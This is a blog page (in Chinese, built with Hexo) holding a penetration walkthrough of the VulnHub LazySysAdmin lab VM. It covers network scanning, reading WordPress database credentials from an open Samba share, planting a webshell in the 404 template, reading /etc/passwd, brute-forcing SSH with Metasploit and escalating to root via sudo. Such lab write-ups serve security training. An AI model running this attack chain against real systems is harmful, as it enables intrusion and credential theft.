@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.2/css/all.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"www.yzbtdiy.com","root":"/","images":"/images","scheme":"Gemini","version":"8.2.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}};
+  </script>
+<meta name="description" content="靶机下载: https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;lazysysadmin-1,205&#x2F; 渗透目标是通过 VMWare 安装的 LazySysAdmin 虚拟机, 网络连接方式为仅主机, 目标 IP 通过 DHCP 分配 主机发现# arp 查询(可选) [root@kali ~]# arp-scan -I eth0 -l  # nmap 扫描(可选) [root@kali">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LazySysAdmin 靶机">
+<meta property="og:url" content="https://www.yzbtdiy.com/security/drone-lazysysadmin.html">
+<meta property="og:site_name" content="YZBTDIY">
+<meta property="og:description" content="靶机下载: https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;lazysysadmin-1,205&#x2F; 渗透目标是通过 VMWare 安装的 LazySysAdmin 虚拟机, 网络连接方式为仅主机, 目标 IP 通过 DHCP 分配 主机发现# arp 查询(可选) [root@kali ~]# arp-scan -I eth0 -l  # nmap 扫描(可选) [root@kali">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/lazysysadmin/port_scan.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/lazysysadmin/smb_no_user.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/lazysysadmin/smb_available_dir.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/lazysysadmin/wp-dir.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/lazysysadmin/sql_deny.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/lazysysadmin/trojan_404.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/lazysysadmin/antsword_data.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/lazysysadmin/read_passwd.png">
+<meta property="article:published_time" content="2021-02-26T02:01:48.000Z">
+<meta property="article:modified_time" content="2021-03-12T09:36:37.930Z">
+<meta property="article:author" content="yzbtdiy">
+<meta property="article:tag" content="drone">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/lazysysadmin/port_scan.png">
+
+
+<link rel="canonical" href="https://www.yzbtdiy.com/security/drone-lazysysadmin.html">
+
+
+<script data-pjax class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+<title>LazySysAdmin 靶机 | YZBTDIY</title>
+  
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">YZBTDIY</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">拥抱开源</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="nav-number">1.</span> <span class="nav-text">主机发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="nav-number">2.</span> <span class="nav-text">端口探测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E8%AF%86%E5%88%AB"><span class="nav-number">3.</span> <span class="nav-text">服务识别</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E6%89%BE%E6%BC%8F%E6%B4%9E"><span class="nav-number">4.</span> <span class="nav-text">查找漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%9D%E8%AF%95%E6%8C%82%E8%BD%BD-samba"><span class="nav-number">4.1.</span> <span class="nav-text">尝试挂载 samba</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8C%82%E8%BD%BD-samba-%E7%9A%84-share-%E7%9B%AE%E5%BD%95"><span class="nav-number">4.2.</span> <span class="nav-text">挂载 samba 的 share$ 目录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95-phpmyadmin"><span class="nav-number">4.3.</span> <span class="nav-text">使用数据库账号密码登录 phpmyadmin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%9D%E8%AF%95%E6%95%B0%E6%8D%AE%E5%BA%93%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95-wordpress"><span class="nav-number">4.4.</span> <span class="nav-text">尝试数据库账号密码登录 wordpress</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E8%9A%81%E5%89%91%E8%8E%B7%E5%8F%96-shell"><span class="nav-number">4.5.</span> <span class="nav-text">通过蚁剑获取 shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%BB%E5%8F%96-passwd"><span class="nav-number">4.6.</span> <span class="nav-text">读取 passwd</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-msf-%E7%88%86%E7%A0%B4%E5%AF%86%E7%A0%81"><span class="nav-number">4.7.</span> <span class="nav-text">使用 msf 爆破密码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ssh-%E7%99%BB%E5%BD%95-togie-%E7%94%A8%E6%88%B7"><span class="nav-number">4.8.</span> <span class="nav-text">ssh 登录 togie 用户</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yzbtdiy"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">yzbtdiy</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">84</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">107</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/yzbtdiy" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yzbtdiy" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:admin@yzbtdiy.com" title="E-Mail → mailto:admin@yzbtdiy.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/yzbtdiy" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;yzbtdiy" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://t.me/yzbtdiy" title="Telegram → https:&#x2F;&#x2F;t.me&#x2F;yzbtdiy" rel="noopener" target="_blank"><i class="fab fa-telegram fa-fw"></i>Telegram</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.yzbtdiy.com/security/drone-lazysysadmin.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="yzbtdiy">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="YZBTDIY">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          LazySysAdmin 靶机
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-02-26 10:01:48" itemprop="dateCreated datePublished" datetime="2021-02-26T10:01:48+08:00">2021-02-26</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-03-12 17:36:37" itemprop="dateModified" datetime="2021-03-12T17:36:37+08:00">2021-03-12</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/security/" itemprop="url" rel="index"><span itemprop="name">security</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p><strong>靶机下载</strong>: <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/lazysysadmin-1,205/">https://www.vulnhub.com/entry/lazysysadmin-1,205/</a></p>
+<p>渗透目标是通过 VMWare 安装的 LazySysAdmin 虚拟机, 网络连接方式为仅主机, 目标 IP 通过 DHCP 分配</p>
+<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># arp 查询(可选)</span>
+<span class="token punctuation">[</span>root@kali ~<span class="token punctuation">]</span><span class="token comment"># arp-scan -I eth0 -l</span>
+
+<span class="token comment"># nmap 扫描(可选)</span>
+<span class="token punctuation">[</span>root@kali ~<span class="token punctuation">]</span><span class="token comment"># nmap -sn 192.168.64.0/24</span>
+
+<span class="token comment"># netdiscover 查询(可选)</span>
+<span class="token punctuation">[</span>root@kali ~<span class="token punctuation">]</span><span class="token comment"># netdiscover -i eth0 -r 192.168.64.0/24</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token punctuation">[</span>root@kali ~<span class="token punctuation">]</span><span class="token comment"># nmap -sS -p1-65535 -v 192.168.64.130</span>
+<span class="token punctuation">..</span>. <span class="token punctuation">..</span>.
+PORT     STATE SERVICE
+<span class="token number">22</span>/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>
+<span class="token number">80</span>/tcp   <span class="token function">open</span>  http
+<span class="token number">139</span>/tcp  <span class="token function">open</span>  netbios-ssn
+<span class="token number">445</span>/tcp  <span class="token function">open</span>  microsoft-ds
+<span class="token number">3306</span>/tcp <span class="token function">open</span>  mysql
+<span class="token number">6667</span>/tcp <span class="token function">open</span>  irc
+MAC Address: 00:0C:29:D5:B9:47 <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
+<span class="token punctuation">..</span>. <span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<span id="more"></span>
+
+<h2 id="服务识别"><a href="#服务识别" class="headerlink" title="服务识别"></a>服务识别</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token punctuation">[</span>root@kali ~<span class="token punctuation">]</span><span class="token comment"># nmap -sV -T4 -p22,80,139,445,3306,6667 192.168.64.130</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img data-src="https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/lazysysadmin/port_scan.png" alt="port_scan"></p>
+<p>发现目标主机上运行的服务有 ssh, http, samba, mysql, irc 等服务</p>
+<h2 id="查找漏洞"><a href="#查找漏洞" class="headerlink" title="查找漏洞"></a>查找漏洞</h2><h3 id="尝试挂载-samba"><a href="#尝试挂载-samba" class="headerlink" title="尝试挂载 samba"></a>尝试挂载 samba</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token punctuation">[</span>root@kali ~<span class="token punctuation">]</span><span class="token comment"># enum4linux 192.168.64.130</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img data-src="https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/lazysysadmin/smb_no_user.png" alt="smb_no_user"></p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/lazysysadmin/smb_available_dir.png" alt="smb_available_dir"></p>
+<p>发现 samba 可以在没有用户名密码的情况下访问, share$ 为共享目录</p>
+<h3 id="挂载-samba-的-share-目录"><a href="#挂载-samba-的-share-目录" class="headerlink" title="挂载 samba 的 share$ 目录"></a>挂载 samba 的 share$ 目录</h3><p>此目录是 web 的根目录, 进入wordpress 目录可以查看配置中的数据库信息</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/lazysysadmin/wp-dir.png" alt="wp-dir"></p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">// ** MySQL settings - You can get this info from your web <span class="token function">host</span> ** //
+/** The name of the database <span class="token keyword">for</span> WordPress */
+define<span class="token punctuation">(</span><span class="token string">'DB_NAME'</span>, <span class="token string">'wordpress'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+/** MySQL database username */
+define<span class="token punctuation">(</span><span class="token string">'DB_USER'</span>, <span class="token string">'Admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+/** MySQL database password */
+define<span class="token punctuation">(</span><span class="token string">'DB_PASSWORD'</span>, <span class="token string">'TogieMYSQL12345^^'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+/** MySQL <span class="token function">hostname</span> */
+define<span class="token punctuation">(</span><span class="token string">'DB_HOST'</span>, <span class="token string">'localhost'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+/** Database Charset to use <span class="token keyword">in</span> creating database tables. */
+define<span class="token punctuation">(</span><span class="token string">'DB_CHARSET'</span>, <span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="使用数据库账号密码登录-phpmyadmin"><a href="#使用数据库账号密码登录-phpmyadmin" class="headerlink" title="使用数据库账号密码登录 phpmyadmin"></a>使用数据库账号密码登录 phpmyadmin</h3><p>查询 wordpress 数据库中的用户名被拒绝</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/lazysysadmin/sql_deny.png" alt="sql_deny"></p>
+<h3 id="尝试数据库账号密码登录-wordpress"><a href="#尝试数据库账号密码登录-wordpress" class="headerlink" title="尝试数据库账号密码登录 wordpress"></a>尝试数据库账号密码登录 wordpress</h3><p>成功进入 wordpress 后台, 在 404 页面添加一句话木马</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/lazysysadmin/trojan_404.png" alt="trojan_404"></p>
+<h3 id="通过蚁剑获取-shell"><a href="#通过蚁剑获取-shell" class="headerlink" title="通过蚁剑获取 shell"></a>通过蚁剑获取 shell</h3><p><img data-src="https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/lazysysadmin/antsword_data.png" alt="antsword_data"></p>
+<h3 id="读取-passwd"><a href="#读取-passwd" class="headerlink" title="读取 passwd"></a>读取 passwd</h3><p>可以看到有一个用户名为 togie 的用户, 并且位于 sudo 组, 可以对此用户尝试 ssh 爆破</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/yzbtdiy/images@main/security/lazysysadmin/read_passwd.png" alt="read_passwd"></p>
+<h3 id="使用-msf-爆破密码"><a href="#使用-msf-爆破密码" class="headerlink" title="使用 msf 爆破密码"></a>使用 msf 爆破密码</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token punctuation">[</span>root@kali ~<span class="token punctuation">]</span><span class="token comment"># msfconsole</span>
+msf6 <span class="token operator">></span> use auxiliary/scanner/ssh/ssh_login
+msf6 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_login<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.64.130
+msf6 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_login<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> username togie
+msf6 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_login<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> pass_file /root/fuzzDicts/passwordDict/top500.txt
+msf6 auxiliary<span class="token punctuation">(</span>scanner/ssh/ssh_login<span class="token punctuation">)</span> <span class="token operator">></span> run
+
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.64.130:22 - Success: <span class="token string">'togie:12345'</span> <span class="token string">'uid=1000(togie) gid=1000(togie) groups=1000(togie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare) Linux LazySysAdmin 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux '</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="ssh-登录-togie-用户"><a href="#ssh-登录-togie-用户" class="headerlink" title="ssh 登录 togie 用户"></a>ssh 登录 togie 用户</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token punctuation">[</span>root@kali ~<span class="token punctuation">]</span><span class="token comment"># ssh togie@192.168.64.130</span>
+<span class="token punctuation">[</span>togie@LazySysAdmin ~<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token function">su</span> -
+<span class="token punctuation">[</span>root@LazySysAdmin ~<span class="token punctuation">]</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/drone/" rel="tag"># drone</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/security/gvm-openvas.html" rel="prev" title="新版 OpenVAS 安装使用">
+                  <i class="fa fa-chevron-left"></i> 新版 OpenVAS 安装使用
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/security/drone-node.html" rel="next" title="Node 靶机">
+                  Node 靶机 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">晋 ICP 备 17000349 号 </a>
+  </div>
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yzbtdiy</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@next-theme/pjax@0.4.0/pjax.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/lozad@1.16.0/dist/lozad.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '.page-configurations',
+    '.main-inner',
+    '.post-toc-wrap',
+    '.languages',
+    '.pjax'
+  ],
+  analytics: false,
+  cacheBust: false,
+  scrollRestoration: false,
+  scrollTo: !CONFIG.bookmark.enable
+});
+
+document.addEventListener('pjax:success', () => {
+  pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  const hasTOC = document.querySelector('.post-toc');
+  document.querySelector('.sidebar-inner').classList.toggle('sidebar-nav-active', hasTOC);
+  document.querySelector(hasTOC ? '.sidebar-nav-toc' : '.sidebar-nav-overview').click();
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+  
+
+
+
+    <div class="pjax">
+
+
+    </div>
+</body>
+</html>
